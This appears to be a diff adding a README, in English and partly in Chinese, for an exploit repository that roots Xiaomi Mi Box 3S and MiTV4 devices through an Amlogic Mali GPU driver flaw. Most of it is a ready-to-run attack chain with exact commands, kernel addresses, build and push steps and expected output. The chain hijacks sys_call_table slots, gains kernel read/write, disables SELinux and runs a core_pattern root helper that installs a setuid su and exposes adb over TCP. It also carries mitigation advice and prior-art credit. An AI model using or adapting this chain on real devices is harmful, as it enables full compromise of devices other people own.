+(`gpu_arb_write 1f6f7a0 ffffffc00111f308`, `kfunc`); see §2.1 and §2.2.
+
+`run.sh` does exactly this, resolving everything except one address at runtime.
+
+---
+
+## 2. Affected devices
+
+### 2.1 Verified on (original device): Xiaomi MiTV4
+
+| item | value |
+|---|---|
+| Model | Xiaomi TV **MiTV4-ANSM0 / L50M5-AD**, product `xmen` |
+| OS | Android 6.0.1, build `21.11.13.2897` |
+| Kernel | Linux **3.14.29**, arm64 (`aarch64`), built 2021-11-13, `#1 SMP PREEMPT` |
+| SoC / GPU | Amlogic **S905L2**, Mali-400, Utgard DDK **r6p1** |
+| RAM | 1 GB, linear map `va = phys + 0xffffffc000000000` |
+| Mitigations | no KASLR, **no PAN**, PXN present, `panic_on_oops=1`, no seccomp/userns/bpf |
+| Node perms | `/dev/mali` and `/dev/ion` are `crw-rw-rw-` (0666) |
+
+### 2.2 Verified on (this repo's target): Xiaomi Mi Box 3S
+
+| item | value |
+|---|---|
+| Model | Xiaomi **Mi Box 3S** (MDZ-19-AA), product `queenchristina` |
+| OS | Android **6.0.1** (SDK 23), vendor build `8.2.2.817`, security patch 2017-04-01 |
+| Kernel | Linux **3.14.29-301318-g9206404**, arm64, built 2018-02-02 |
+| SoC / GPU | Amlogic **S905X**, Mali-400, Amlogic Utgard DDK |
+| RAM | linear map `va = phys + 0xffffffc000000000` |
+| Mitigations | SELinux **Enforcing**, no seccomp, `CapEff=0` for `shell`; `/dev/mali` and `/dev/ion` are 0666 |
+| Result | `uid=0`, `context=u:r:kernel:s0`, `CapEff 0000001fffffffff` — see `PORT_MIBOX3S.md` |
+
+This device needs three extra steps that the MiTV4 does not; they are worth
+knowing before porting anywhere else:
+
+1. **`/dev/ion` mmap is broken on this firmware.** Every `mmap()` of an
+   ion/dma-buf fd returns the bogus address `0x400008` — even with `MAP_FIXED`.
+   The original `gpu_arb_write` therefore segfaults inside `build_shader()` and
+   **never submits a GPU job**; writes appear to "work sometimes" only when
+   `0x400008` happens to be mapped in that process. `src/gpwrite.c` avoids ion
+   entirely: the command buffer is a plain file page, its physical address comes
+   from `/proc/self/pagemap`, and it is attached to the GPU with the *external*
+   backend, followed by `__ARM_NR_cacheflush`.
+2. **`sys_call_table` is a hot cache line.** It is read on every syscall, so a
+   GPU (DMA) write lands in DRAM but the CPU keeps serving the old entry from
+   L1/L2. A scan of the whole `.data`/`.rodata` finds nothing until the cache is
+   evicted; `gpwrite64`/`kfunc_new` now walk an 8 MB buffer right before the
+   probe/call (`cache_thrash()`), after which the write is visible.
+3. **Bitness selects the table.** A 32-bit probe goes through
+   `compat_sys_call_table` (`.text`), a 64-bit one through `sys_call_table`.
+   Both the scanner and the caller must be aarch64.
+
+Firmware-specific addresses for this build:
+
+| symbol | address |
+|---|---|
+| `sys_call_table` (physical base) | `0x1ee7000` |
+| `sys_call_table[244]` (physical) | `0x1ee77a0` |
+| `kallsyms_lookup_name` | `0xffffffc00111e5d0` |
+| `memcpy` | `0xffffffc0013e1270` |
+| `selinux_enforcing` | `0xffffffc0020cff24` |
+| `core_pattern` | `0xffffffc001f1c0c8` |
+
+Do not copy MiTV4's addresses: its `0xffffffc00111f308` lands inside
+`do_acct_process.isra.4+0x368` here. `kfunc_new bt <addr>` turns
+`dump_backtrace` into a read-only `%pS` oracle (it prints `symbol+off/size` for
+any address without executing it), which is how `kallsyms_lookup_name` was
+located on this build.
+
+### 2.3 Condition for other devices
+
+
+Any device is affected if **all** of these hold:
+
+1. it ships the **Amlogic-derived Utgard** driver with
+   `mali_mem_validation_check()` compiled to `return _MALI_OSK_ERR_OK`
+   (see §3 — this is an Amlogic change, not upstream Arm code);
+2. `/dev/mali` is accessible to the attacker's domain (0666 here ⇒ **any app**,
+   not just `shell`);
+3. the kernel is reachable from the GPU's DMA path (no TZASC/IOMMU isolating it).
+
+Kernel 3.14 with a 32-bit userland is irrelevant to the technique, but note the
+**64-bit/32-bit syscall table difference** in §5.2 — it matters.
+
+---
+
+## 3. Root cause: physical-address validation compiled out
+
+`utgard/<ver>/common/mali_mem_validation.c` (Amlogic published tree):
+
+```c
+_mali_osk_errcode_t mali_mem_validation_check(u32 phys_addr, u32 size)
+{
+#if 0
+	/* real range check against mali_mem_validator (the framebuffer range) */
+	...
+	return _MALI_OSK_ERR_OK;
+	return _MALI_OSK_ERR_FAULT;
+#else
+	return _MALI_OSK_ERR_OK;      /* <-- accepts anything */
+#endif
+}
+```
+
+Call path (single caller):
+
+```
+userspace ioctl(MALI_IOC_MEM_BIND, flags |= BACKEND_EXTERNAL_MEMORY, phys_addr = X)
+  -> _mali_ukk_mem_bind()                    linux/mali_memory_manager.c
+  -> mali_mem_bind_ext_buf(..., X, ...)      linux/mali_memory_external.c
+  -> mali_mem_validation_check(X, size)      -> always OK
+  -> mali_mmu_pagedir_update(session->page_directory, virt, X, size, DEFAULT)
+```
+
+So `X` is written straight into the GPU page directory: userspace gains GPU
+read/write access to **any** physical page.
+
+### 3.1 Whose bug is it? (Amlogic, not Arm)
+
+This matters for scoping a report, so state it precisely:
+
+| tree | `mali_mem_validation_check` |
+|---|---|
+| Amlogic published `kernel/amlogic-tv-modules/mali-driver`, Utgard **r5p1 / r6p1 / r7p0 / r10p0** | compiled out (`#if 0`) |
+| independent repo with an original Utgard **r6p1** import ([`superna9999/meson_gx_mali_450`](https://github.com/superna9999/meson_gx_mali_450/blob/391322531863c8b6c719ba7f3e832afb9999ccd3/driver/src/devicedrv/mali/common/mali_mem_validation.c)) | **full check retained** |
+
+Both files carry an ARM copyright header, so the header alone proves nothing.
+The regression is in the **Amlogic derivative**, and only there.
+
+Also note `mali_mem_validation_add_range()` has exactly one caller in the whole
+driver (`common/mali_kernel_core.c`, registering the framebuffer range), i.e.
+even with the check enabled it would only ever whitelist the framebuffer.
+
+References:
+- Amlogic publish commit: <https://android.googlesource.com/kernel/amlogic-tv-modules/mali-driver/+/7c6e2c22d0cb0e39e969e39bdc0398a2c2f205d9>
+- Same defect in r6p2: <https://android.googlesource.com/kernel/amlogic-tv-modules/mali-driver/+/refs/tags/android-tv-10.0.0_r0.1/utgard/r6p2/common/mali_mem_validation.c>
+
+---
+
+## 4. The write primitive (this part is the engineering)
+
+Mapping is not enough — we need a **controlled write**. Utgard's PP (pixel
+processor) is programmed from a command buffer we build ourselves, and its
+write-back stage emits the fragment colour to the render target.
+
+`src/gpu_arb_write.c` allocates a command buffer from ion, binds it with
+`MALI_IOC_MEM_BIND` (DMA_BUF backend) at `CMD_VA`, fills in a 5-instruction
+fragment shader plus the render-target descriptor, binds the **target physical
+page** with the external backend at `EXT_VA`, and submits one
+`MALI_IOC_PP_START_JOB` (408 bytes).
+
+The descriptor that matters sits at job offset 168:
+
+```c
+put32(job, 168, 0x02);                     /* write-back */
+put32(job, 172, EXT_VA + (phys & 0xfff));  /* destination */
+put32(job, 176, pixel_format);             /* width of the burst */
+```
+
+### 4.1 `pixel_format` calibration (measured on hardware)
+
+Each job emits **32 pixels**; the byte width follows from the format:
+
+| `pixel_format` | bytes written | payload |
+|---|---|---|
+| **0x06** | **128** | the same 8-byte value, byte order preserved, repeated 16× |
+| 0x08 | 64 | low 32 bits repeated 16× |
+| 0x03 / 0x0f | 64 | one 32-bit value (permuted from the constants) |
+| 0x00,01,02,05,07,0e | 32 | one 32-bit value (dither pattern) |
+| **0x09,0a,0b,0c** | **16** | **all zero** |
+| 0x04 / 0x0d | 16 | 0x44444444 / 0x33333333 |
+
+Additional measured facts:
+
+- only the **low 4 bits** of `pixel_format` matter (`0x06 ≡ 0x16 ≡ 0x26`);
+- the `wh` field (`(0x400<<16)|0x400`) has **no effect** on the footprint
+  (tested with 7 values) — the 32-pixel burst is fixed;
+- **there is no 4-byte or 8-byte granularity**; the minimum is 16 bytes;
+- placement is **exact** for `0x06` (request `+0x40` ⇒ changed range `0x40..0xbc`)
+  and for `0x09` (16 bytes, no overflow);
+- the PoC calibrates this on a private ion page at start-up and aborts if the
+  measured footprint is not exactly 128 bytes at the requested offset.
+
+### 4.2 Cache coherency — the trap
+
+- **cold** data (`lease_break_time`, `core_pattern`): the GPU DMA write takes
+  effect immediately;
+- **hot** variables read on every permission check (`selinux_enforcing`,
+  `panic_on_oops`): the GPU write has **no effect** — `getenforce` keeps
+  returning `Enforcing`, because the CPU keeps serving the value from its cache.
+- `sys_call_table` sits in between and **must not be assumed cold**. It is read
+  on every syscall, so its cache line is resident: on the Mi Box 3S a DMA write
+  into the table is invisible until that line is evicted, and a page scan of the
+  entire `.data`/`.rodata` finds nothing. Walking a buffer a few MB wide right
+  before the probe/call (`cache_thrash()` in `src/gpwrite.c` and `src/kfunc.c`)
+  forces the eviction, after which the entry is reloaded from DRAM and the
+  hijack takes effect.
+
+That is why the final step must be a **CPU-side** write (through the hijacked
+`memcpy`), not a GPU write. Hours were lost to this; do not skip it.
+
+---
+
+## 5. From arbitrary physical write to kernel R/W
+
+### 5.1 `sys_call_table` has 16 free slots
+
+On this kernel `sys_call_table` is an array of **8-byte** pointers (arm64).
+Entries `[244..259]` are all `sys_ni_syscall` — 16 consecutive "not
+implemented" slots that nothing ever calls.
+
+`sys_call_table[244]` for this firmware:
+
+```
+virtual  = 0xffffffc001f6f000 + 244*8 = 0xffffffc001f6f7a0
+physical = 0x1f6f7a0                       (.data drift is 0x4000 here)
+```
+
+One `gpu_arb_write` call writes 128 bytes = exactly those 16 entries, and stops
+at the table boundary — no collateral.
+
+> Accuracy note: entries `[278..293]` are `0x0` in a 2022 vmlinux recovered from
+> a flash dump, but on this 2021 firmware calling syscall 278 returned `-EPERM`,
+> so it is **not** a usable hole here. Only `[244..259]` was verified.
+
+### 5.2 The table you hit depends on the caller's bitness
+
+| caller | table used | location |
+|---|---|---|
+| 32-bit process | `compat_sys_call_table` | **`.text`** (`0xffffffc00108d000`) |
+| **64-bit process** | `sys_call_table` | **`.data`** (`0xffffffc001f6f000`) |
+
+So the function-calling helper must be a **64-bit** binary. This device happily
+executes static aarch64 binaries even though its userland is 32-bit-only; if
+yours does not, you must attack `compat_sys_call_table` in `.text` instead
+(different problem: drift and I-cache).
+
+The GPU write helper can stay 32-bit (it only touches `.data` and uses ion,
+whose ioctl layouts differ between 32/64-bit anyway).
+
+### 5.3 Bootstrapping a symbol resolver
+
+`kallsyms_lookup_name(const char *name)` returns the address of a symbol. Put
+its address in the slots and `syscall(244, "name")` resolves anything:
+
+```
+kfunc sym commit_creds        -> 0xffffffc0010c8df0   (matches vmlinux exactly)
+kfunc sym selinux_enforcing   -> 0xffffffc0021697bc
+kfunc sym memcpy              -> 0xffffffc0013e75c0   (vmlinux has 0x13e76b0: drift -0xf0)
+```
+
+This is why only **one** firmware-specific constant is needed for the whole
+chain: `kallsyms_lookup_name` itself. Everything downstream — including
+`memcpy`, whose drift is *not* zero — is resolved by the kernel.
+
+### 5.4 Arbitrary read/write
+
+Overwrite the slots with `memcpy` and the syscall becomes a memcpy:
+
+```
+kfunc show 0xffffffc0021697b0 32   # memcpy(user, kernel, n)  -> kernel read
+kfunc zero 0xffffffc0021697bc 4    # memcpy(kernel, user, n)  -> kernel write
+```
+
+Read-back of the SELinux globals (before / after) is in §6.
+
+---
+
+## 6. Disabling SELinux
+
+Resolved addresses on this firmware:
+
+| symbol | address |
+|---|---|
+| `avc_callbacks` | `0xffffffc0021697b0` |
+| `selinux_secmark_refcount` | `0xffffffc0021697b8` |
+| **`selinux_enforcing`** | **`0xffffffc0021697bc`** |
+| `sel_inode_cache` | `0xffffffc0021697c0` |
+| `default_noexec` | `0xffffffc0021697c8` |
+
+```
+kfunc zero 0xffffffc0021697bc 4     # CPU-side 4-byte write
+```
+
+```
+before: ... 00000000 01000000 003f1000c0ffffff ...   (enforcing = 1)
+after : ... 00000000 00000000 003f1000c0ffffff ...   (enforcing = 0, sel_inode_cache intact)
+getenforce -> Permissive
+```
+
+> Alternative that needs no resolver: the 16-byte zero burst (`pixel_format
+> 0x09`) aimed at `avc_callbacks` (= `enforcing - 0xC`) covers exactly
+> `avc_callbacks(8) + secmark_refcount(4) + enforcing(4)` and stops one byte
+> before `sel_inode_cache`, so no `kmem_cache` pointer is touched. It fails for
+> the cache reason in §4.2, hence the CPU write.
+
+---
+
+## 7. Root
+
+Once SELinux is permissive, the kernel's core-dump pipe helper is a root
+executor (no LSM gate on `core_pattern`):
+
+```
+kfunc str <core_pattern> "|/data/local/tmp/roothelper.sh"
+# crash a process with RLIMIT_CORE set
+```
+
+`roothelper.sh` runs as `uid=0`, `context=u:r:kernel:s0`. See the file; it
+installs a setuid `su` and makes adb reachable over TCP after reboots.
+
+An alternative that avoids `core_pattern` (also verified): point the slots at
+`prepare_kernel_cred`, take the returned root cred pointer, point them at
+`commit_creds`, and call it. **Do not reuse the cred pointer across processes** —
+`exit_creds()` drops it to zero and you get a use-after-free.
+
+---
+
+## 8. Build and run
+
+### 8.1 Prerequisites
+
+- `adb` with the box authorised — `adb devices` must list it. Everything below runs
+  as an ordinary `adb shell` (uid 2000); **root is the result, not a requirement**.
+- One cross toolchain: `aarch64-linux-gnu-gcc` + `arm-linux-gnueabihf-gcc`, **or**
+  [zig](https://ziglang.org), where `make zig` needs no sysroot and no gcc.
+- Nothing installed on the device: the helpers are statically linked and run under
+  `/system/bin/sh`.
+
+### 8.2 Build
+
+```sh
+make                          # Mi Box 3S chain: gpwrite64 kfunc_new kread crash_for_core
+make zig                      # same, with zig as the cross compiler
+make gpu_arb_write gpu_scan   # upstream 32-bit helpers (MiTV4 path / reference)
+```
+
+`kfunc_new` **must** be aarch64: a 32-bit caller is dispatched through
+`compat_sys_call_table` in `.text` and can never hit the table this exploit patches
+(§5.2). `gpwrite64` is aarch64 for the same reason — the write itself is
+bitness-agnostic, the probes it does are not.
+
+### 8.3 Push
+
+```sh
+make install
+```
+
+or by hand:
+
+```sh
+adb push gpwrite64 kfunc_new kread crash_for_core run.sh roothelper.sh /data/local/tmp/
+adb shell 'cd /data/local/tmp && chmod 755 gpwrite64 kfunc_new kread crash_for_core run.sh roothelper.sh'
+```
+
+### 8.4 Verify the primitive before touching the table
+
+```sh
+adb shell /data/local/tmp/gpwrite64 place 0
+# [*] test page phys=0x47e5d000 +0x0
+# [*] changed [0x0..0x7f] count=128 PLACEMENT OK
+```
+
+`PLACEMENT OK` means one 128-byte GPU write really landed where `pagemap` said that
+page is. On `MISMATCH` or `count=0`, stop — the primitive is not working and every
+later step would be writing garbage into kernel memory (§4).
+
+### 8.5 Run
+
+```sh
+adb shell /data/local/tmp/run.sh
+```
+
+```
+[run] stage 0: sys_call_table[244..259] <- kallsyms_lookup_name
+[run] memcpy            = 0xffffffc0013e1270
+[run] selinux_enforcing = 0xffffffc0020cff24
+[run] core_pattern      = 0xffffffc001f1c0c8
+[run] stage 2: sys_call_table[244..259] <- memcpy
+[run] stage 3: selinux_enforcing = 0
+[run] getenforce -> Permissive
+[run] stage 4: core_pattern <- |/data/local/tmp/roothelper.sh
+[run] stage 5: triggering coredump
+[run] success - helper ran as root:
+    uid=0(root) gid=0(root) ... context=u:r:kernel:s0
+```
+
+`roothelper.sh` writes its own output to `/data/local/tmp/root.log` and, if
+`/data/local/tmp/su` is present, installs it as a setuid `su` (§7).
+
+### 8.6 A different firmware
+
+Only two constants are build-specific; everything else is resolved at run time:
+
+```sh
+KLN_ADDR=ffffffc00111e5a0 SLOT_PHYS=1eaf7a0 adb shell /data/local/tmp/run.sh
+```
+
+| build | `SLOT_PHYS` | `KLN_ADDR` |
+|---|---|---|
+| `8.2.2.817` — what `run.sh` ships | `1ee77a0` | `ffffffc00111e5d0` |
+| `6.8.22.145` | `1eaf7a0` | `ffffffc00111e5a0` |
+
+Recovering both on an unknown build — including one where you have no root at all —
+is in §10 and [FINDING_ADDRESSES.md](FINDING_ADDRESSES.md).
+
+### 8.7 When it fails
+
+| symptom | cause |
+|---|---|
+| `place` prints `MISMATCH` or `count=0` | the write is not landing: `/dev/mali` must be `0666`, and this unit needs the `pixel_format` from §4.1 |
+| `cannot resolve memcpy (slot wrong?)` | `SLOT_PHYS` is not `sys_call_table[244]` on this build |
+| instant reboot / black screen | kernel oops with `panic_on_oops=1`. A wrong address **faults**, it does not fail softly — verify offline first (§10) |
+| `gpwrite64 missing (build: make gpwrite64)` | pushed without `chmod 755`, or the binary is the wrong architecture |
+
+---
+
+## 9. Prior art, and what is actually new here
+
+### 9.1 This technique is already public
+
+**RIPMaliUtgard / kort** (author Luke / lr-m) published the same core path —
+external physical page bind, hand-configured PP/write-back, overwrite a kernel
+function pointer:
+
+- first commit **2026-02-16** — <https://github.com/lr-m/RIPMaliUtgard/commit/4dec3d8783c30864a4fdc8ad1620598236bce8c4>
+- port to the newer driver path **2026-02-19** — <https://github.com/lr-m/RIPMaliUtgard/commit/1f55bfae18d730ba3de032392a6d9e190ff01455>
+- repo — <https://github.com/lr-m/RIPMaliUtgard>
+
+The author's 2026-03-01 writeup discusses `MEM_BIND / bind_ext_memory` for r6p2+
+and the r6p2 source it links carries the same `#if 0`. Neither the repo nor the
+writeup carries a CVE.
+
+So: **the path and the root cause are not ours.** What this repo adds is a
+verified instance on a specific product plus the differences below.
+
+### 9.2 Differences worth checking
+
+| # | difference |
+|---|---|
+| 1 | **unused `sys_call_table` slots** as a generic kernel-function call primitive, including the 32-bit vs 64-bit table distinction (`compat_sys_call_table` is in `.text`) |
+| 2 | **`kallsyms_lookup_name` as a bootstrap resolver**, then re-pointing the same slots at `memcpy` for arbitrary kernel R/W — so only one firmware-specific constant is needed |
+| 3 | the **`pixel_format` width table** in §4.1 (minimum 16 bytes, `wh` irrelevant, exact placement) |
+| 4 | the **cache-coherency split** in §4.2 (cold data: GPU write works; hot variables: must be a CPU write) |
+
+### 9.3 Related CVEs that are *not* this bug
+
+| CVE | why it is not this |
+|---|---|
+| [CVE-2022-36449](https://nvd.nist.gov/vuln/detail/CVE-2022-36449) | Midgard/Bifrost/Valhall (**kbase**) use-after-free / OOB write / mapping info leak; Utgard is not listed |
+| [CVE-2022-34830](https://nvd.nist.gov/vuln/detail/CVE-2022-34830) | Utgard **TOCTOU race → use-after-free**; not an unvalidated address bind |
+
+As of 2026-10-27 no CVE matching this root cause was found, and none is claimed
+here. Whether one was ever filed privately needs a CNA duplicate check.
+
+Background on GPU-assisted kernel exploitation in general:
+[PhantomMap (NDSS 2025)](https://www.ndss-symposium.org/ndss-paper/phantommap-gpu-assisted-kernel-exploitation/),
+and the DEF CON SG talk
+[Finding a Generic Mali GPU Read/Write Primitive](https://media.defcon.org/DEF%20CON%20SG%201/DEF%20CON%20SG%201%20main%20stage%20presentations/Shuquan%20Zhou%2C%20Guang%20Gong%2C%20Jun%20Yao%20-%20Finding%20a%20Generic%20Mali%20GPU%20Read-Write%20Primitive%20for%20Real-World%20Exploit%20Development.pdf).
+
+---
+
+## 10. Notes for porting to another firmware
+
+Only two unknowns, both static per build:
+
+1. **`kallsyms_lookup_name`** — the bootstrap address.
+   Without symbols: it sits early in `.text`, so its drift is usually 0. On this
+   device it is exactly the vmlinux value (`0xffffffc00111f308`).
+2. **`sys_call_table`** — `sys_call_table + 244*8`, minus
+   `0xffffffc000000000` to get the physical address.
+
+A cheap way to find candidate slots on a new build: parse the *shipped* vmlinux
+(or a boot-image dump) and look for the longest run of `sys_ni_syscall`; then
+confirm at runtime with a harmless call, e.g. put `kallsyms_lookup_name` there
+and resolve a symbol whose address you already know. A wrong slot panics, so
+verify offline first.
+
+---
+
+## 11. Mitigation
+
+For vendors maintaining such a tree:
+
+- re-enable `mali_mem_validation_check()` (and register the intended range), or
+- reject the external-memory backend outright unless a privileged caller asks,
+  and
+- tighten the device node: `/dev/mali` at 0666 lets **any app** do this.
+
+For the owner of an affected device: there is no user-side fix — the check is
+compiled into the kernel. Keep untrusted apps off the device, or run a firmware
+where the driver is fixed.
+
+---
+
+## 12. Scope, legality, disclaimer
+
+- Published for **research and repair of hardware you own**. It requires an
+  already-privileged foothold (`adb shell`, i.e. the device is already yours) or
+  a locally installed app; it is not a remote exploit.
+- The underlying technique is **already public** (§9.1). This repo does not
+  claim a new vulnerability class, and does not claim a CVE.
+- Addresses are for one firmware build. Running this against a different build
+  will very likely **panic the kernel** (`panic_on_oops=1` here ⇒ reboot).
+- Some steps modify `/system` (setuid `su`) and persistent properties. Undo with
+  `mount -o rw,remount /system && rm /system/xbin/su`, and
+  `setprop persist.adb.tcp.port ""`.
+- No warranty. Use entirely at your own risk.
+
+---
+
+## 13. Files
+
+| file | target | purpose |
+|---|---|---|
+| `src/gpwrite.c` | aarch64 | ion-free writer: file page + `/proc/self/pagemap` + external bind (required on Mi Box 3S) |
+| `src/gpu_arb_write.c` | armv7 | arbitrary physical 128-byte write via the Utgard write-back unit (ion path) |
+| `src/gpu_scan.c` | armv7 | in-process probe loop that locates `sys_call_table[244]` |
+| `src/kfunc.c` | aarch64 | call a kernel function through unused `sys_call_table` slots |
+| `src/crash_for_core.c` | armv7 | raise `RLIMIT_CORE` and die with SIGSEGV so `core_pattern` fires |
+| `src/kread.c` | aarch64 | 3-argument caller for the physmap canary payload (address discovery) |
+| `run.sh` | — | drives the whole chain (Mi Box 3S constants) |
+| `roothelper.sh` | — | runs as root from `core_pattern`; installs `su`, fixes adb |
+| `root_cmd.sh` | — | example payload for the helper (starts `tvagent`) |
+| `Makefile` | — | build, including a `zig` target |
+| `PORT_MIBOX3S.md` | — | port log: addresses, ion / cache / bitness gotchas |
+| `FINDING_ADDRESSES.md` | — | re-deriving `SLOT_PHYS` / `KLN_ADDR` on an unrooted build |
+
+## 14. Keywords
+
+**Device / platform** — Xiaomi Mi Box 3S, MiBox3S, MDZ-19-AA, `queenchristina`,
+Xiaomi TV box, set-top box, Android TV, Android 6.0.1, Amlogic S905X, Mali-400,
+Utgard DDK r6p1, kernel 3.14, arm64 / aarch64, armv8l.
+
+**Vulnerability / technique** — local privilege escalation (LPE), root, rooting,
+uid 0, `/dev/mali` (0666), `/dev/ion`, unvalidated external memory bind, GPU
+write-back unit, arbitrary physical write, `sys_call_table`,
+`compat_sys_call_table`, `kallsyms_lookup_name`, kallsyms, `memcpy`, SELinux
+permissive, `core_pattern`, `panic_on_oops`, cache coherency, physmap
+(ret2dir-style), kernel exploitation, proof of concept (PoC).
+
+**Related** — MiTV4 (same driver flaw, different build),
+`mali_mem_validation_check`, Amlogic, CVE-2022-34830, CVE-2022-36449 (neither is
+this bug).
+
+## 15. License
+
+MIT — see `LICENSE`. The upstream text and code are © 2026 Yeuoly
+([Yeuoly/mitv4-utgard-lpe](https://github.com/Yeuoly/mitv4-utgard-lpe)); the Mi Box 3S
+port added in this repository is released under the same MIT terms.
+
+```
+
+`README.zh-CN.md`:
+
+```md
+# MiBox3S（Amlogic Utgard）—— 外部内存绑定缺少物理地址校验导致的本地提权
+
+[English](README.md) | **简体中文**
+
+> **来源。** 本仓库最初是
+> [Yeuoly/mitv4-utgard-lpe](https://github.com/Yeuoly/mitv4-utgard-lpe)（MIT）的 fork，
+> 那个仓库记录的是同一处驱动缺陷在小米电视 MiTV4（S905L2）上的利用；它又建立在
+> [lr-m/RIPMaliUtgard](https://github.com/lr-m/RIPMaliUtgard) 的公开研究之上（见第 9 节）。
+> 上游文字在仍然适用的地方保持原样；标注 Mi Box 3S 的章节、§1 里的命令、§8 的构建步骤
+> 由本仓库改写。新增文件：`src/gpwrite.c`、`src/kread.c`、`PORT_MIBOX3S.md`、
+> `FINDING_ADDRESSES.md`。
+>
+> **目标机型。** 小米盒子 3S（MDZ-19-AA，build `8.2.2.817`，Android 6.0.1，内核
+> `3.14.29-301318-g9206404`）。`run.sh` 里已经填好这台机器的两个常量
+> （`SLOT_PHYS=1ee77a0`、`KLN_ADDR=ffffffc00111e5d0`），并驱动本 `Makefile` 编出的
+> aarch64 helper；本文其余部分的 MiTV4 地址为什么不适用，见 §2.2 与
+> [PORT_MIBOX3S.md](PORT_MIBOX3S.md)。
+
+一条在 **小米盒子 3S**（MDZ-19-AA，Amlogic S905X，Mali-400，Utgard DDK）上经过实测验证的完整链路：
+从无特权的 `adb shell`（uid 2000，`u:r:shell:s0`）拿到 `uid=0` 并让 SELinux 变为 permissive；
+换成 MiTV4（S905L2）自己的两个常量，同一条链在 §2.1 那台机器上同样成立。
+
+内核侧总共只改动 **132 字节**（`128 + 4`）。没有 ROP、没有堆喷、没有 KASLR bypass、没有使用 CVE。
+
+> **运行前请先读最后一节的范围声明与免责声明。**
+
+---
+
+## 1. 一句话概括
+
+```
+# sys_call_table[244..259] 是 16 个连续的空槽位（原本全是 sys_ni_syscall，没人调用）。
+# 一次 GPU 写把这 16 个槽位全部填成同一个函数地址，内核随后就会把 244 号系统调用
+# 直接派发进去（arm64：表项 8 字节，参数在 x0..x5，返回值在 x0；本 SoC 没有 PAN，
+# 所以内核可以直接读我们用户态的字符串和缓冲区）。
+
+# --- 小米盒子 3S，build 8.2.2.817：也就是 run.sh 里写死的那两个常量 ---
+gpwrite64 write 1ee77a0 ffffffc00111e5d0  # 槽位 -> kallsyms_lookup_name
+kfunc_new sym memcpy                      # -> 0xffffffc0013e1270   （这就是解析器）
+
+gpwrite64 write 1ee77a0 <memcpy>          # 同一批槽位 -> memcpy
+kfunc_new zero  0xffffffc0020cff24 4      # selinux_enforcing -> 0
+kfunc_new str   0xffffffc001f1c0c8 '|/data/local/tmp/roothelper.sh'
+crash_for_core                            # 触发 coredump -> 内核以 root 身份执行该脚本
+```
+
+在 MiTV4 上同一条链用的是那台机器的两个常量
+（`gpu_arb_write 1f6f7a0 ffffffc00111f308`、`kfunc`），见 §2.1 与 §2.2。
+
+`run.sh` 做的就是这件事；除了一个地址之外，其余全部在运行期解析。
+
+---
+
+## 2. 受影响的设备
+
+### 2.1 已验证的机型（原始设备）：小米电视 MiTV4
+
+| 项 | 值 |
+|---|---|
+| 型号 | 小米电视 **MiTV4-ANSM0 / L50M5-AD**，product `xmen` |
+| 系统 | Android 6.0.1，build `21.11.13.2897` |
+| 内核 | Linux **3.14.29**，arm64（aarch64），构建于 2021-11-13，`#1 SMP PREEMPT` |
+| SoC / GPU | Amlogic **S905L2**，Mali-400，Utgard DDK **r6p1** |
+| 内存 | 1 GB，线性映射 `va = phys + 0xffffffc000000000` |
+| 缓解措施 | 无 KASLR、**无 PAN**；有 PXN；`panic_on_oops=1`；无 seccomp/userns/bpf |
+| 节点权限 | `/dev/mali` 与 `/dev/ion` 均为 `crw-rw-rw-`（0666） |
+
+### 2.2 已验证的机型（本仓库的目标）：小米盒子 3S
+
+| 项 | 值 |
+|---|---|
+| 型号 | 小米**盒子 3S**（MDZ-19-AA），product `queenchristina` |
+| 系统 | Android **6.0.1**（SDK 23），厂商版本号 `8.2.2.817`，安全补丁 2017-04-01 |
+| 内核 | Linux **3.14.29-301318-g9206404**，arm64，构建于 2018-02-02 |
+| SoC / GPU | Amlogic **S905X**，Mali-400，Amlogic Utgard DDK |
+| 内存 | 线性映射 `va = phys + 0xffffffc000000000` |
+| 缓解措施 | SELinux **Enforcing**，无 seccomp；`shell` 的 `CapEff=0`；`/dev/mali`、`/dev/ion` 均为 0666 |
+| 结果 | `uid=0`，`context=u:r:kernel:s0`，`CapEff 0000001fffffffff` —— 详见 `PORT_MIBOX3S.md` |
+
+这台设备比 MiTV4 多了三步，移植到别处之前值得先知道：
+
+1. **本固件的 `/dev/ion` mmap 是坏的。** 对 ion/dma-buf fd 的任何 `mmap()`
+   （包括 `MAP_FIXED`）都返回 `0x400008`。原版 `gpu_arb_write` 因此会在
+   `build_shader()` 里段错误，**GPU job 根本没提交**；只有 `0x400008` 恰好落在
+   该进程已映射段里时才"碰巧能用"。`src/gpwrite.c` 完全绕开 ion：命令缓冲区用
+   普通文件页，物理地址取自 `/proc/self/pagemap`，再用 **external 后端**绑进
+   GPU，提交前 `__ARM_NR_cacheflush`。
+2. **`sys_call_table` 的缓存行是热的。** 它每次系统调用都会被读，GPU（DMA）写
+   只落到 DRAM，而 CPU 继续从 L1/L2 拿旧表项。不冲刷缓存的话，把整个
+   `.data`/`.rodata` 扫一遍也不会命中；`gpwrite64` 和 `kfunc_new` 现在会在
+   探测/调用前走一遍 8 MB 缓冲（`cache_thrash()`），强制该行换出重载。
+3. **位数决定命中哪张表。** 32 位探测走 `compat_sys_call_table`（`.text`），
+   64 位才走 `sys_call_table`。扫描器和调用者都必须是 aarch64。
+
+本 build 的地址：
+
+| 符号 | 地址 |
+|---|---|
+| `sys_call_table` 物理基址 | `0x1ee7000` |
+| `sys_call_table[244]` 物理地址 | `0x1ee77a0` |
+| `kallsyms_lookup_name` | `0xffffffc00111e5d0` |
+| `memcpy` | `0xffffffc0013e1270` |
+| `selinux_enforcing` | `0xffffffc0020cff24` |
+| `core_pattern` | `0xffffffc001f1c0c8` |
+
+**不要照抄 MiTV4 的地址**：它的 `0xffffffc00111f308` 在本机落在
+`do_acct_process.isra.4+0x368` 内部。`kfunc_new bt <addr>` 把
+`dump_backtrace` 变成一个只读的 `%pS` oracle（对任意地址打印
+`symbol+off/size`，不执行、不会崩），本机的 `kallsyms_lookup_name`
+就是这么定位出来的。
+
+### 2.3 其他设备受影响的条件
+
+同时满足以下三条即受影响：
+
+1. 使用 **Amlogic 派生版 Utgard 驱动**，且其中 `mali_mem_validation_check()`
+   被编译成 `return _MALI_OSK_ERR_OK`（见第 3 节——这是 Amlogic 的改动，
+   不是 Arm 上游代码）；
+2. `/dev/mali` 对攻击者所在域可访问（本机是 0666 ⇒ **任何普通 app**，
+   不需要 `shell`）；
+3. 内核处于 GPU 的 DMA 可达范围内（没有被 TZASC / IOMMU 隔离）。
+
+"内核 3.14 + 32 位用户态"与手法本身无关，但请注意第 5.2 节的
+**64 位 / 32 位系统调用表差异**，这一点很关键。
+
+---
+
